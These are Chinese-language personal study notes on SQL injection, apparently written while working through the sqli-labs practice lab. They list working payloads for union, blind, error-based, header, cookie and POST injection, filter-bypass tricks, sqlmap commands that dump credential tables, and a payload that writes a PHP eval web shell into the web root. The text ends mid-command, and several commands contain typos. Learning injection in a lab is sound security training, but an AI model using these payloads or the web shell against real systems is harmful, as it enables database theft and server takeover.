
sql注入：
    原理：
        select * from admin where username='admin' or 1=1  -- 'and password='用户输入的密码'

    数字型 
    字符型

    注入遇到的问题：
        被添加斜杠：
            尝试各种编码绕过
            切换版本：
                PHP 版本 5.4 起 magic_quotes_gpc 值为 false

        输入反斜杠看报错信息可以获取闭合符号

    注入过程：
        判断注入点：
            1'
        order by 判断字段数：
            1%27 order by 3
        union select 获取表名：
            先判断显位：
                0' union select 1,2,3
            获取数据：
                0%27 UNION select 1,group_concat(table_name),table_schema from information_schema.tables where table_schema=database()
                user()
                database()
                version()
        union select 获取列名：
            0%27 UNION select 1,group_concat(column_name),3 from information_schema.columns where table_name=%27users%27
        union select 获取字段值：
            0%27 UNION select 1,group_concat(username, 0x3a, password),3 from users

    SQL盲注：
        时间盲注：
            id=1%27%20and%20if(ascii(substr(database(),1,1))=115, 1, sleep(9))
        布尔盲注：
            id=1%27%20and%20length(database())>10

    MySQL读写文件：
        前提：
            1. 权限足够
            2. secure_file_priv 不为 null

        绝对路径
        读：
            select load_file("e:\\flag.txt")
        写：
            把 '<?php phpinfo();?>' 写入了 1.php
            ?id=-1')) union select 1, '<?php phpinfo();?>', 3 into outfile 'D:\\phpstudy\\phpstudy\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\1.php' --+


        过程：
            查出字段：
                1' order by 4       
            查出显位：
                -1' union select 1,2,3
            在显位读入文件：
                -1%27%20union select 1, load_file("d:\\flag.txt"),3

            写入 webshell：
                @ 符号屏蔽错误信息
                    ?id=-1')) union select 1, '<?php @eval($_POST[x]); ?>', 3 into outfile 'D:\phpstudy\phpstudy\phpstudy_pro\WWW\sqli-labs\Less-7\2.php'
                然后用中国菜刀连接？？？？？！！！！！

    POST注入：
        复制 BP 截断的 HTTP 请求数据包到文本文件
        sqlmap -r 文件路径 -p 指定探测参数

    报错注入：
        select count(*) from table group by floor(rand(0)*2)
        查询的时候如果使用 rand()，该值会被计算多次。在使用 group by 的时候，floor(rand(0)*2)会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次。在一次多记录的查询过程中floor(rand(0)*2)的值是定性的，为011011。
        less-5/index.php?id=0' union select 1,2,3 from (select count(*), concat((select concat(version(), 0x3a, 0x3a, database(), 0x3a, 0x3a, user(), 0x3a) limit 0, 1), floor(rand(0)*2))x from information_schema.tables group by x)a --+

    SQL注入绕过：
        大小写绕过：
            关键字：and， 使用 AnD 绕过
        双写绕过：
            关键字：and，使用 anandd 绕过，中间的 and 被发现替换，剩下前面 an 和 后面 d，
        编码绕过：
            URL编码
        内联注释绕过：
            MySQL中内联注释的内容可以被当作SQL语句执行
            /*!select*/ * from admin;  
            /*!select * from admin */;

    POST基于时间和布尔的注入：
        时间：
            在参数后加： and if(length(database())>5, sleep(5), null) --+

            admin' and (select (if(length(database())>5, sleep(5), null))) --+

        布尔：
            admin' and (length(database())>1) --+

        sqlmap.py -u "http://127.0.0.1/sqli/Less-15" --data "uname=admin&passwd=123456&submit=Submit"


        SQLMap：
            获取请求报文
            sqlmap.py -r target.txt --technique T -p uname
            sqlmap.py -r target.txt --technique B -p uname
            sqlmap.py -r target.txt --dbs

    HTTP头的注入：
        用户提交的参数都被过滤，但是HTTP头的参数可能没有被过滤

        User-Agent注入：
            结尾加 \ 看是否报错
            ' and updatexml(1, concat(0x7e, (select @@version), 0x7e), 1) or '1' = '1

        Refere:
            ' or '1' ='1 
            ' or(length(database()))>8 or if(1=1, sleep(5), null) or '1' = '1

        SQLMap：
            sqlmap.py -u "less17" --forms 自动搜索表单注入
            sqlmap.py -u "less17" --data "n=1%p=1" 指定参数探索

            指定位置进行注入，在保存的文件中，对于参数的修改为*
            执行 sqlmap.py -r target.txt

    POST update注入：
        update 表名称 set 列名称=新值 where 更新条件;

        password = admin' or updatexml(1, concat(0x7e, version(), 0x7e), 1) --+

        sqlmap：
            sqlmap.py -r target.txt -p password
    
    cookie注入：
        注入语句同上

        sqlmap：
            sqlmap.py -r target.txt --level 3 --batch
            文件中探测的属性，该值为 * 

    cookie base64 注入：
        二进制->字符
        brup suite拦截请求可以看到输入的表单是否被加密

        sqlmap：
            sqlmap.py -r target.txt --level 3 --tamper base64encode.py

    绕过去除注释符：
        单行注释：
            --+ 或者 --格 或者 #
        多行注释：
            /* 注释内容 */

        目的：
            绕过 preg_replace() 正则的搜索和替换

        绕过：
            主动闭合 or '1'='1
                id=-1' union select 1, database(), '3

        sqlmap：

    绕过去除and和or：
        目的：
            绕过 preg_replace() 正则的搜索和替换
        绕过：
            大小写
            十六进制、URL编码
            and 等于 &&、or 等于 ||
            /*! 内联注释 */ 会被当作SQL语句执行
                a/**/nd 
            双写绕过
                oorr

    绕过去除空格：
        hex、url编码
        id=1'%0a||'1     id=1'||'1
        id=1'%09||'1

        sqlmap:
            sqlmap.py -u "url" --hex --dbs --batch

    绕过去除select和union：
        同上
        
    SQLmap： 
        探测：
            -u 探测url
            --dbs 探测数据库
            --current-db 查看当前数据库
            -batch 默认选择
            --technique T 指定探测技术 time
            --file-read
            --file-write
            --file-dest

            sqlmap.py -u [url] --dbs  
            sqlmap.py -r target.txt -p username --dbs

        指定数据库：
            sqlmap.py -u [url] -D cms --tables
        指定表：
            sqlmap.py -u [url] -D cms -T articles --columns
        指定字段：
            sqlmap.py -u [url] -D cms -T articles -C id,title,content --dump


        less-1实战：
            sqlmap.py -u "http://127.0.0.1:8080/sqli/less-1/?id=1" --dbs --batch
            sqlmap.py -u "http://127.0.0.1:8080/sqli/less-1/?id=1" -D securtiy --talbes --batch
            sqlmap.py -u "http://127.0.0.1:8080/sqli/less-1/?id=1" -D securtiy -T users --columnsd --batch
            sqlmap.py -u "http://127.0.0.1:8080/sqli/less-1/?id=1" -D security -T users -C "username, password" --dump

        less-9实战：
            sqlmap.py -u "http://127.0.0.1:8080/sqli/less-9/?id=1" --technique T --dbs --batch

        less-7读写文件实战：
            sqlmap.py -u "http://127.0.0.1:8080/sqli/less-7/?id=1" --file-read "d:\\flag.txt"
            
        POST注入：
            sqlmap.py -r target.txt -p username --current-db

        less-6:
            sqlmpa.py -u 